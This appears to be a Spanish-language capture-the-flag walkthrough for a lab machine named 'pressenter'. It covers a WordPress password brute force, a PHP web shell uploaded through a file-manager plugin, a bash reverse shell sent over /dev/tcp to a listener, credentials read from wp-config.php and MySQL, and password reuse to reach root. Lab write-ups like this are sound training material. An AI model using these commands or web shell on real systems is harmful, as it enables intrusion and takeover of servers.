## Reconocimiento:

Puerto 80 : HTTP

En la web no se puede hacer mucho, pero en la parte inferior hay un dominio.

```bash
http://pressenter.hl
```

Es una página WordPress, y nos da un usuario llamado pressi. De una paso al ataqué de fuerza bruta:

```bash
wpscan --url http://pressenter.hl/ --usernames pressi --passwords /usr/share/wordlists/rockyou.txt
```

Pass : dumbass

Dentro de WordPress instalo el plugin File Manager y subo un archivo malicioso a la carpeta /wp-content/uploads/:

cmd.php

```bash
<?php
  system($_GET["cmd"]);
?>
```

Me pongo en escucha:

```bash
nc -lnvp 4444
```

Y ejecuto en el navegador:

```bash
http://pressenter.hl/wp-content/uploads/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/4444 <%261'
```

Recibo conexión.

## Escalada www-data → enter

```bash
cd /var/www/pressenter/
```

En esa ruta hay un archivo de configuración wordpress con las credenciales de mysql:

```bash
cat wp-config.php
# Info:
/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'rooteable' );
```

Entro a mysql:

```bash
mysql -u admin -prooteable
show databases;
use wordpress;
show tables;
select * from wp_usernames;
```

Vemos la contraseña para el usuario enter:

```bash
kernellinuxhack
```

## Escalada enter → root

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/cat
(ALL : ALL) NOPASSWD: /usr/bin/whoami
```

Intento un buen rato pero no consigo nada, siendo estos binarios una distracción, pruebo reutilizar la contraseña y funciona:

```bash
su root
kernellinuxhack
```

Listo.
